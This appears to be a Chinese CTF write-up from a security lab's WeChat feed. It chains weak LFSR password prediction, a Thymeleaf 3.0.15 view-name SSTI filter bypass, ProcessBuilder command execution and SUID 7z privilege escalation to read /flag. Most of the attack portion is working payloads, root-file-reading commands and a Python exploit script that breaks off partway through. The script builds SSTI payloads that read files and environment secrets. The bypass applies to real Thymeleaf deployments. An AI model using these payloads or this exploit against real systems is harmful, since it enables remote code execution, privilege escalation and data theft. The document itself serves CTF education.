---
title: 软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向：完整 RCE 到 Root 提权
url: https://mp.weixin.qq.com/s/qwvE_nsegyb7EJkP7eXyxQ
source: Doonsec's feed
date: 2026-03-16
fetch_date: 2026-03-17T04:10:52.613582
---

# 软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向：完整 RCE 到 Root 提权

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2AAMh9HmvsRCGrkxClIu6epcNN7jpXmxINrJRU5Rfgn6wXZsWj5kVJQicniarsiceuicUX6P8efezsI4CqzQyic1Xz8FEYAwyq0pErwiaAEruaKC8/0?wx_fmt=jpeg)

# 软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向：完整 RCE 到 Root 提权

原创

wallkone
wallkone

星络安全实验室

![]()

在小说阅读器中沉浸阅读

|  |
| --- |
| 免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责 |

这是一道典型的 **多漏洞链利用题**，目标是从普通用户权限最终读取 root 才能访问的 `/flag`。

整个攻击链分为三步：

1. **弱 PRNG 预测 admin 密码**
2. **Thymeleaf 3.0.15 视图名注入 → RCE**
3. **利用 SUID 程序读取 root 文件**

完整攻击路径如下：

```
PRNG预测 → admin登录 → Thymeleaf SSTI → RCE → SUID提权 → 读取 /flag
```

---

# 一、弱 PRNG 预测 admin 密码

注册用户时系统会直接返回一个 **16 位数字密码**：

```
Your password: 0056831083091497
```

看起来像随机数，但实际上它 **直接来自 PRNG 状态**。

核心实现如下：

```
feedback = ((state>>47) ^ (state>>46) ^ (state>>43) ^ (state>>42)) & 1;state = ((state >> 1) | (feedback << 47)) & MASK;
```

这是一个 **48-bit LFSR（线性反馈移位寄存器）**。

关键特点：

* 状态空间：48 bit
* **可逆**
* 每次 `next()` 更新一次状态

---

## PRNG 初始化顺序

系统启动后 PRNG 调用顺序为：

```
seed
 ↓
next() × 9
 ↓
admin password (#10)
 ↓
user1 (#11)
user2 (#12)
user3 (#13)
user4 (#14)
user5 (#15)
 ↓
新注册用户 (#16)
```

也就是说：

```
registered_user = admin_password 向前走了 6 步
```

因此只需要：

```
逆向 6 步
```

理论上有：

```
2^6 = 64 个候选
```

逐个尝试即可登录 admin。

---

## 逆向 LFSR

正向：

```
new = (old >> 1) | (feedback << 47)
```

逆向时：

```
old = (new << 1) | bit0
```

其中 `bit0` 可能是 `0` 或 `1`。

因此每一步会产生两个候选。

最终：

```
2^6 = 64 个候选状态
```

验证方式：

```
candidate → forward 6 steps → 是否等于已知状态
```

筛选即可得到真实的 admin 密码。

---

# 二、Thymeleaf 视图名注入

登录 admin 后，可以访问 `/admin`：

```
@GetMapping("/admin")public String adminPage(...,        @RequestParam(defaultValue = "main") String section) {    if (!"admin".equals(username)) {        return "redirect:/";    }    return "admin :: " + section;}
```

这里存在一个关键问题：

```
section 完全可控
```

最终返回：

```
admin :: <user input>
```

而 **Thymeleaf 支持表达式预处理**：

```
__${...}__
```

因此如果可以控制视图名，就可能触发 **模板表达式执行**。

---

# 绕过 Thymeleaf 3.0.15 的限制

Thymeleaf 3.0.15 对直接表达式做了一些拦截：

```
__${...}__
```

但可以通过 **literal substitution** 绕过：

```
|...|
```

以及 `$${}` 构造表达式：

```
__|$${'{...}'}|__
```

例如：

```
__|$${'{#response.setHeader(''X-Poc'',''1'')?:''main''}'}|__
```

成功执行后会在响应头看到：

```
X-Poc: 1
```

证明 **SSTI 已成功触发**。

---

# 三、利用 SSTI 执行命令

Thymeleaf 表达式可以直接调用 Java 类：

```
new.java.lang.ProcessBuilder(...)
```

最终 payload：

```
new.java.lang.ProcessBuilder({'sh','-c','command'}).start().waitFor()
```

这样即可实现 **远程命令执行（RCE）**。

---

# 四、提权读取 `/flag`

RCE 后发现当前用户为：

```
ctf
```

而 `/flag` 权限为：

```
-r-------- 1 root root /flag
```

普通用户无法读取。

但系统中存在一个 **SUID 程序**：

```
/usr/bin/7z
```

这意味着它会以 **root 权限执行**。

---

## 利用 7z 读取 root 文件

可以利用 7z 打包 `/flag`：

```
/usr/bin/7z a -ttar -an -so /flag
```

输出为 tar 流。

再交给 `tar` 读取：

```
/usr/bin/7z a -ttar -an -so /flag 2>/dev/null | /bin/tar -xOf -
```

即可得到：

```
flag{...}
```

---

# 五、完整利用流程

最终 exploit 自动完成：

1️⃣ 注册用户获取 PRNG 状态

2️⃣ 逆向 LFSR 恢复 admin 密码

3️⃣ 登录 admin

4️⃣ 利用 Thymeleaf SSTI 获取 RCE

5️⃣ 执行命令读取 `/flag`

示例：

```
python3 exploit.py http://target/
```

直接执行命令：

```
python3 exploit.py cmd http://target/ <admin_password> "id"
```

读取 flag：

```
python3 exploit.py cmd http://target/ <admin_password> "/usr/bin/7z a -ttar -an -so /flag | /bin/tar -xOf -"
```

---

# 六、EXP

```
```bash#!/usr/bin/env python3"""PRNG-CTF Exploit攻击思路：1. 注册用户获取 PRNG 状态（密码即为完整 48-bit 状态）2. 逆向 LFSR 6 步恢复 admin 密码3. 以 admin 身份登录4. 利用 Thymeleaf 3.0.15 SSTI (视图名注入) 获取 flag漏洞链：  - 弱 PRNG (48-bit LFSR, 可逆向)  - Thymeleaf SSTI: return "admin :: " + section    section 参数可控，__${SpEL}__ 预处理表达式会被执行    绕过 3.0.15: new. 代替 new + 空格"""import requestsimport sysimport reimport urllib.parseimport uuidMASK = 0xFFFFFFFFFFFF  # 48-bit mask (281474976710655)# ============================================================# PRNG (LFSR) 相关# ============================================================def lfsr_forward(state):    """LFSR 正向一步 (与 Java 端完全一致)"""    feedback = ((((state >> 47) ^ (state >> 46)) ^ (state >> 43)) ^ (state >> 42)) & 1    return ((state >> 1) | (feedback << 47)) & MASKdef lfsr_reverse_candidates(state):    """    LFSR 逆向一步，返回 2 个候选前驱状态。    正向: new = (old >> 1) | (feedback << 47)    逆向: old = (new << 1) | bit0, bit0 = 0 或 1    """    candidates = []    for bit0 in [0, 1]:        prev = ((state << 1) | bit0) & MASK        candidates.append(prev)    return candidatesdef reverse_n_steps(state, n):    """逆向 n 步，返回所有 2^n 个候选状态"""    candidates = [state]    for _ in range(n):        new_candidates = []        for s in candidates:            new_candidates.extend(lfsr_reverse_candidates(s))        candidates = new_candidates    return candidatesdef verify_forward(candidate, target, steps):    """从 candidate 正向走 steps 步，验证是否到达 target"""    state = candidate    for _ in range(steps):        state = lfsr_forward(state)    return state == targetdef format_password(state):    """将 PRNG 状态格式化为 16 位密码字符串"""    return f"{state % 10000000000000000:016d}"def crack_admin_password(registered_password):    """    从注册用户的密码（PRNG 状态）逆向推算 admin 密码。    PRNG 状态序列：    seed → next()×9 → adminPwd(#10) → user1(#11) → ... → user5(#15) → registered(#16)    需要从 #16 逆向 6 步到 #10    """    state = registered_password    steps_back = 6    print(f"[*] 已知 PRNG 状态: {state} (0x{state:012x})")    print(f"[*] 逆向 {steps_back} 步，共 {2**steps_back} 个候选...")    candidates = reverse_n_steps(state, steps_back)    # 正向验证筛选    valid = []    for c in candidates:        if verify_forward(c, state, steps_back):            valid.append(c)    # 去重    valid = list(set(valid))    print(f"[+] 正向验证通过: {len(valid)} 个候选")    for v in valid:        print(f"    状态: {v} (0x{v:012x}) -> 密码: {format_password(v)}")    return valid# ============================================================# Thymeleaf SSTI 相关# ============================================================def build_view_name_payload(expression):    """    生成适用于 Thymeleaf 3.0.15 视图名注入的 payload。    关键绕过:      1. __...__ 预处理      2. |...| literal substitution      3. $${...} 生成最终的 ${...}，避开 SpringRequestUtils 直接拦截    """    escaped = expression.replace("'", "''")    return "__|$${'{" + escaped + "}'}|__"def build_header_payload(header_name, value_expression, fallback="main"):    expr = (        f"#response.setHeader('{header_name}',''+({value_expression}))?:'{fallback}'"    )    return build_view_name_payload(expr)def get_ssti_payloads(webhook_url=None):    proof_path = "/tmp/thymeleaf_ssti_proof"    payloads = [        {            "name": "SSTI canary",            "payload": build_view_name_payload("#response.setHeader('X-Poc','1')?:'main'"),            "header": "X-Poc",        },        {            "name": "Bean access randomService.getSeed()",            "payload": build_header_payload("X-Seed", "@randomService.getSeed()"),            "header": "X-Seed",        },        {            "name": "Bean access randomService.getCurrentState()",            "payload": build_header_payload("X-State", "@randomService.getCurrentState()"),            "header": "X-State",        },        {            "name": "Create local proof file",            "payload": build_header_payload(                "X-File",                f"new.java.io.File('{proof_path}').createNewFile()"            ),            "header": "X-File",        },        {            "name": "Read /flag",            "payload": build_header_payload(                "X-Flag",                "new.java.util.Scanner(new.java.io.File('/flag')).useDelimiter('\\\\A').next()"            ),            "header": "X-Flag",        },        {            "name": "Read /flag.txt",            "payload": build_header_payload(                "X-Flag",                "new.java.util.Scanner(new.java.io.File('/flag.txt')).useDelimiter('\\\\A').next()"            ),            "header": "X-Flag",        },        {            "name": "Read FLAG env",            "payload": build_header_payload("X-Flag", "@environment.getProperty('FLAG'...